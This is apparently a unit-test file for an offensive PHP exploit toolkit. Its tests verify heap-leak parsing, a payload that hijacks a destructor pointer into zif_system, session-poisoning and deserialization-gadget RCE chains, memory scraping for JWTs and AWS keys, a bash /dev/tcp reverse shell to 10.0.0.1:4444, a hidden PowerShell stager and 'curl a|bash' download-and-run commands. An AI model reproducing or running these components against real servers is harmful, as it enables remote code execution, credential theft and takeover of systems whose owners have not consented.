#!/usr/bin/env python3
# Birim testler — python3 -m unittest discover -s tests -v
import argparse
import importlib.util
import os
import struct
import sys
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def load(name, relpath):
    path = os.path.join(ROOT, relpath)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


exploit = load("php2shell_exploit", "exploit/php2shell_exploit.py")
memd = load("memdisclosure", "exploit/memdisclosure.py")
bug3 = load("bug3", "exploit/bug3_backtrace_uaf.py")
bug4 = load("bug4", "exploit/bug4_opcache_confusion.py")
chain_a = load("chain_a", "exploit/chain_a_session_lfi.py")
chain_c = load("chain_c", "exploit/chain_c_mismatch_rce.py")
scanner = load("scanner", "tools/scanner.py")
calib = load("calibrate", "tools/calibrate_offsets.py")
shellsrv = load("shell_server", "tools/shell_server.py")


class TestCookieParsing(unittest.TestCase):
    def test_cookie_value(self):
        resp = b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=abc%41def; path=/\r\n\r\n"
        self.assertEqual(exploit.cookie_value(resp), b"abcAdef")

    def test_cookie_absent(self):
        self.assertEqual(exploit.cookie_value(b"HTTP/1.1 200 OK\r\n\r\n"), b"")

    def test_chunk_base_needs_eight_repeats(self):
        chunk = 0x7242F2400000
        raw = b"".join(struct.pack("<Q", chunk + 0x1230) for _ in range(4))
        self.assertEqual(exploit.chunk_base_from_cookie(raw), 0)

    def test_chunk_base_from_cookie(self):
        chunk = 0x7242F2400000
        raw = bytearray(b"\x00" * 4096)
        for i in range(20):
            struct.pack_into("<Q", raw, i * 8, chunk + 0x690D8)
        self.assertEqual(
            exploit.chunk_base_from_cookie(bytes(raw)), chunk)

    def test_libphp_base_alignment_check(self):
        base = 0x7242F40D1000
        raw = bytearray(b"\x00" * 64)
        struct.pack_into("<Q", raw, 0, 0x1111)
        struct.pack_into("<Q", raw, 8, base + exploit.LINUX_DTOR_OFFSET)
        self.assertEqual(
            exploit.libphp_base_from_cookie(bytes(raw),
                                            exploit.LINUX_DTOR_OFFSET),
            base)

    def test_libphp_base_rejects_misaligned(self):
        raw = bytearray(b"\x00" * 64)
        struct.pack_into("<Q", raw, 8, 0x7242F40D1000 + 0x123)
        self.assertEqual(
            exploit.libphp_base_from_cookie(bytes(raw),
                                            exploit.LINUX_DTOR_OFFSET), 0)


class TestPayload(unittest.TestCase):
    def _exploit(self, cmd="id>/out/p"):
        t = exploit.Target("http://127.0.0.1/index.php", quiet=True)
        return exploit.Exploit(t, cmd, exploit.LINUX_ZIF_OFFSET,
                               exploit.LINUX_DTOR_OFFSET,
                               exploit.LINUX_HTDATA_OFFSET)

    def test_cmd_limit_enforced(self):
        with self.assertRaises(SystemExit):
            self._exploit("x" * (exploit.MAX_CMD + 1))

    def test_payload_layout(self):
        ex = self._exploit()
        ht, ref = ex._payload(0x7242F24690D8, 0x7242F4536370)
        self.assertEqual(len(ht), 167)
        # pDestructor (0x30) -> zif_system
        self.assertEqual(struct.unpack_from("<Q", ht, 0x30)[0],
                         0x7242F4536370)
        # komut 0x98'de, NUL sonlandirmali
        self.assertEqual(ht[0x98:0x98 + 9], b"id>/out/p")
        self.assertEqual(ht[0x98 + 9], 0)
        # referans htdata'ya isaret eder (0x18)
        self.assertEqual(struct.unpack_from("<Q", ref, 0x18)[0],
                         0x7242F24690D8)

    def test_multipart_structure(self):
        body = exploit.multipart(
            [{"name": "a", "data": b"1"},
             {"name": "f", "filename": "x.txt", "data": b"2"}], b"BND")
        self.assertIn(b'--BND\r\nContent-Disposition: form-data; name="a"', body)
        self.assertIn(b'filename="x.txt"', body)
        self.assertTrue(body.endswith(b"--BND--\r\n"))

    def test_windows_stager_fits_cmd_limit(self):
        cmd = "curl a/w|cmd"
        self.assertLessEqual(len(cmd), exploit.MAX_CMD)
        self.assertLessEqual(len("curl a|bash"), exploit.MAX_CMD)

    def test_tls_verify_default_on(self):
        t = exploit.Target("https://127.0.0.1/index.php", quiet=True)
        self.assertTrue(t.verify_tls)
        t2 = exploit.Target("https://127.0.0.1/index.php", quiet=True,
                            verify_tls=False)
        self.assertFalse(t2.verify_tls)


class TestMemDisclosure(unittest.TestCase):
    def test_find_strings(self):
        data = b"\x00\x01hello world\x00ab\x00PHPSESSID=xyz\xff"
        strs = memd.find_strings(data)
        self.assertIn(b"hello world", strs)
        self.assertNotIn(b"ab", strs)

    def test_extract_pointers_range(self):
        raw = struct.pack("<Q", 0x7242F24690D8) + struct.pack("<Q", 0x1234)
        ptrs = memd.extract_pointers(raw)
        self.assertIn(0x7242F24690D8, ptrs)
        self.assertNotIn(0x1234, ptrs)

    def test_find_secrets_jwt_and_aws(self):
        jwt = (b"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0."
               b"abcDEF123-_xyz")
        found = memd.find_secrets(b"token: " + jwt + b" AKIAIOSFODNN7EXAMPLE")
        types = {s["type"] for s in found}
        self.assertIn("JWT", types)
        self.assertIn("AWS Access Key", types)


class TestScanner(unittest.TestCase):
    def test_parse_version(self):
        self.assertEqual(scanner.parse_php_version("8.4.26"), (8, 4, 26))
        self.assertEqual(scanner.parse_php_version("bozuk"), (0, 0, 0))

    def test_version_matrix(self):
        self.assertTrue(scanner.is_version_vulnerable("8.4.26")[0])
        self.assertFalse(scanner.is_version_vulnerable("8.4.27")[0])
        self.assertTrue(scanner.is_version_vulnerable("8.3.35")[0])
        self.assertFalse(scanner.is_version_vulnerable("8.3.36")[0])
        self.assertTrue(scanner.is_version_vulnerable("8.5.11")[0])
        self.assertFalse(scanner.is_version_vulnerable("8.5.12")[0])
        self.assertFalse(scanner.is_version_vulnerable("7.4.33")[0])

    def test_sapi_matrix(self):
        self.assertTrue(scanner.is_sapi_exploitable("mod_php")[0])
        self.assertFalse(scanner.is_sapi_exploitable("fpm")[0])
        self.assertFalse(scanner.is_sapi_exploitable("unknown")[0])

    def test_unknown_sapi_is_not_labelled_fpm(self):
        info = {"php_version": "8.4.26", "sapi": "unknown",
                "server": "Apache", "headers": {}}
        with mock.patch.object(scanner, "detect_php_info", return_value=info), \
             mock.patch.object(scanner.socket, "gethostbyname",
                               return_value="127.0.0.1"):
            result = scanner.scan_target("http://target.local")
        self.assertEqual(result.status, scanner.Status.UNKNOWN)
        self.assertNotEqual(result.status,
                            scanner.Status.FPM_NOT_EXPLOITABLE)

    def test_known_fpm_is_labelled_fpm(self):
        info = {"php_version": "8.4.26", "sapi": "fpm",
                "server": "nginx", "headers": {}}
        with mock.patch.object(scanner, "detect_php_info", return_value=info), \
             mock.patch.object(scanner.socket, "gethostbyname",
                               return_value="127.0.0.1"):
            result = scanner.scan_target("http://target.local")
        self.assertEqual(result.status, scanner.Status.FPM_NOT_EXPLOITABLE)


class TestBug3Classify(unittest.TestCase):
    def test_classify(self):
        self.assertEqual(bug3.classify_consumer(None), "crash")
        self.assertEqual(bug3.classify_consumer(500), "error")
        self.assertEqual(bug3.classify_consumer(503), "error")
        self.assertEqual(bug3.classify_consumer(200), "clean")
        self.assertEqual(bug3.classify_consumer(404), "other")


class TestBug4DataStructures(unittest.TestCase):
    def test_shm_layout_utilization(self):
        layout = bug4.SHMLayout(used_memory=800, free_memory=200)
        self.assertAlmostEqual(layout.utilization, 80.0)
        self.assertEqual(layout.total_memory, 1000)

    def test_shm_layout_zero_mem(self):
        layout = bug4.SHMLayout()
        self.assertAlmostEqual(layout.utilization, 0.0)

    def test_calibration_result_defaults(self):
        cal = bug4.CalibrationResult()
        self.assertEqual(cal.optimal_ml, 0)
        self.assertFalse(cal.partial_persist_detected)

    def test_corruption_result_defaults(self):
        cr = bug4.CorruptionResult()
        self.assertFalse(cr.corrupted)

    def test_leak_result_defaults(self):
        lr = bug4.LeakResult()
        self.assertFalse(lr.confused)
        self.assertEqual(lr.chunk_base, 0)
        self.assertEqual(lr.libphp_base, 0)

    def test_rce_result_defaults(self):
        rce = bug4.RCEResult()
        self.assertFalse(rce.success)

    def test_is_user_pointer(self):
        self.assertTrue(bug4.is_user_pointer(0x7F42F2400000))
        self.assertTrue(bug4.is_user_pointer(0x7242F2400000))
        self.assertFalse(bug4.is_user_pointer(0x1234))
        self.assertFalse(bug4.is_user_pointer(0x0000800000000000))


class TestCalibrate(unittest.TestCase):
    NM = (
        "0000000000465370 T zif_system\n"
        "000000000065eb60 T zval_ptr_dtor\n"
        "0000000000112233 T baska_sembol\n"
        "                 U malloc@@GLIBC_2.2.5\n"
    )

    def test_parse_nm(self):
        syms = calib.parse_nm_output(self.NM)
        self.assertEqual(syms["zif_system"], 0x465370)
        self.assertEqual(syms["zval_ptr_dtor"], 0x65EB60)
        self.assertNotIn("malloc", syms)

    def test_build_offsets_missing_symbol(self):
        with self.assertRaises(SystemExit):
            calib.build_offsets({"zif_system": 0x1000})

    def test_format_cli(self):
        out = calib.format_cli({"zif_system": 0x465370,
                                "zval_ptr_dtor": 0x65EB60})
        self.assertIn("--zif-offset 0x465370", out)
        self.assertIn("--dtor-offset 0x65eb60", out)


class TestShellServer(unittest.TestCase):
    def test_linux_oneliner(self):
        body = shellsrv.get_linux_bash_oneliner("10.0.0.1", 4444)
        self.assertIn("/dev/tcp/10.0.0.1/4444", body)

    def test_windows_stager_is_powershell(self):
        body = shellsrv.get_windows_stager("10.0.0.1", 4444)
        self.assertIn("powershell -nop -w hidden -e", body)

    def test_os_specific_test_commands(self):
        self.assertIn("whoami", shellsrv.get_test_commands("windows"))
        self.assertIn("id", shellsrv.get_test_commands("linux"))


class TestChainASessionLFI(unittest.TestCase):
    def test_import(self):
        self.assertTrue(hasattr(chain_a, "main"))
        self.assertTrue(hasattr(chain_a, "run_chain"))
        self.assertTrue(hasattr(chain_a, "inject_session"))
        self.assertTrue(hasattr(chain_a, "trigger_lfi"))

    def test_argparse(self):
        with mock.patch("sys.argv", ["chain_a", "--host", "10.0.0.1",
                                     "--port", "8080", "--command", "whoami",
                                     "--lfi-param", "file",
                                     "--lfi-path", "/vuln.php"]):
            ap = argparse.ArgumentParser()
            ap.add_argument("--host", default="127.0.0.1")
            ap.add_argument("--port", type=int, default=80)
            ap.add_argument("--command", default="id")
            ap.add_argument("--lfi-param", default=None)
            ap.add_argument("--lfi-path", default="/index.php")
            args = ap.parse_args()
            self.assertEqual(args.host, "10.0.0.1")
            self.assertEqual(args.port, 8080)
            self.assertEqual(args.command, "whoami")

    def test_random_session_id_length(self):
        sid = chain_a.random_session_id(32)
        self.assertEqual(len(sid), 32)
        self.assertTrue(sid.isalnum())

    def test_random_session_id_default(self):
        sid = chain_a.random_session_id()
        self.assertEqual(len(sid), 26)

    def test_build_session_poison_payload(self):
        payload = chain_a.build_session_poison_payload("id")
        self.assertIn("system", payload)
        self.assertIn("id", payload)
        self.assertTrue(payload.startswith("<?php"))
        self.assertTrue(payload.endswith("?>"))

    def test_build_session_file_path(self):
        path = chain_a.build_session_file_path("/tmp/sessions", "abc123")
        self.assertEqual(path, "/tmp/sessions/sess_abc123")

    def test_build_multipart_structure(self):
        body = chain_a.build_multipart(
            [{"name": "a", "data": b"1"},
             {"name": "f", "filename": "test.txt", "data": b"2"}],
            b"TESTBND")
        self.assertIn(b"--TESTBND\r\n", body)
        self.assertIn(b'name="a"', body)
        self.assertIn(b'filename="test.txt"', body)
        self.assertTrue(body.endswith(b"--TESTBND--\r\n"))

    def test_default_session_paths(self):
        self.assertIn("/tmp/sessions", chain_a.DEFAULT_SESSION_PATHS)
        self.assertIn("/var/lib/php/sessions", chain_a.DEFAULT_SESSION_PATHS)

    def test_default_lfi_params(self):
        self.assertIn("page", chain_a.DEFAULT_LFI_PARAMS)
        self.assertIn("file", chain_a.DEFAULT_LFI_PARAMS)
        self.assertIn("include", chain_a.DEFAULT_LFI_PARAMS)

    def test_extract_command_output_filters_session(self):
        body = "upload_progress_foo|a:1:{}\nuid=0(root)\n"
        out = chain_a._extract_command_output(body)
        self.assertIn("uid=0(root)", out)
        self.assertNotIn("upload_progress", out)

    def test_parse_status(self):
        self.assertEqual(chain_a._parse_status(b"HTTP/1.1 200 OK\r\n"), 200)
        self.assertEqual(chain_a._parse_status(b"HTTP/1.1 404 Not Found\r\n"), 404)
        self.assertEqual(chain_a._parse_status(b"garbage"), 0)

    def test_parse_body(self):
        resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nbody_content"
        self.assertEqual(chain_a._parse_body(resp), b"body_content")


class TestChainCMismatchRCE(unittest.TestCase):
    def test_import(self):
        self.assertTrue(hasattr(chain_c, "main"))
        self.assertTrue(hasattr(chain_c, "run_chain"))
        self.assertTrue(hasattr(chain_c, "poison_session"))
        self.assertTrue(hasattr(chain_c, "trigger_mismatch"))

    def test_argparse(self):
        with mock.patch("sys.argv", ["chain_c", "--host", "10.0.0.1",
                                     "--port", "9090", "--command", "whoami",
                                     "--gadget", "Guzzle"]):
            ap = argparse.ArgumentParser()
            ap.add_argument("--host", default="127.0.0.1")
            ap.add_argument("--port", type=int, default=80)
            ap.add_argument("--command", default="id")
            ap.add_argument("--gadget", default="Monolog")
            args = ap.parse_args()
            self.assertEqual(args.host, "10.0.0.1")
            self.assertEqual(args.port, 9090)
            self.assertEqual(args.gadget, "Guzzle")

    def test_known_gadgets(self):
        self.assertIn("Monolog", chain_c.KNOWN_GADGETS)
        self.assertIn("Guzzle", chain_c.KNOWN_GADGETS)
        self.assertIn("Laravel", chain_c.KNOWN_GADGETS)
        self.assertIn("Symfony", chain_c.KNOWN_GADGETS)

    def test_gadget_has_required_fields(self):
        for name, g in chain_c.KNOWN_GADGETS.items():
            self.assertIn("class", g, f"{name} missing 'class'")
            self.assertIn("property", g, f"{name} missing 'property'")
            self.assertIn("chain", g, f"{name} missing 'chain'")

    def test_build_php_serialize_payload(self):
        payload = chain_c.build_php_serialize_payload("id", "Monolog")
        self.assertIsInstance(payload, bytes)
        self.assertIn(b"Monolog", payload)
        self.assertIn(b"id", payload)

    def test_build_php_serialize_payload_guzzle(self):
        payload = chain_c.build_php_serialize_payload("whoami", "Guzzle")
        self.assertIn(b"GuzzleHttp", payload)
        self.assertIn(b"whoami", payload)

    def test_build_poison_filename_has_pipe(self):
        filename = chain_c.build_poison_filename("id")
        self.assertTrue(filename.startswith("|"))

    def test_build_multipart_structure(self):
        body = chain_c.build_multipart(
            [{"name": "x", "data": b"y"}], b"BND")
        self.assertIn(b"--BND\r\n", body)
        self.assertTrue(body.endswith(b"--BND--\r\n"))

    def test_filter_php_errors(self):
        body = ('<b>Warning</b>: something\n'
                '<br /> in /var/www on line 5\n'
                'uid=0(root) gid=0(root)\n')
        out = chain_c._filter_php_errors(body)
        self.assertIn("uid=0(root)", out)
        self.assertNotIn("Warning", out)

    def test_random_session_id(self):
        sid = chain_c.random_session_id(20)
        self.assertEqual(len(sid), 20)
        self.assertTrue(sid.isalnum())

    def test_parse_status(self):
        self.assertEqual(chain_c._parse_status(b"HTTP/1.1 502 Bad Gateway\r\n"), 502)
        self.assertEqual(chain_c._parse_status(b"HTTP/1.1 200 OK\r\n"), 200)


if __name__ == "__main__":
    unittest.main()
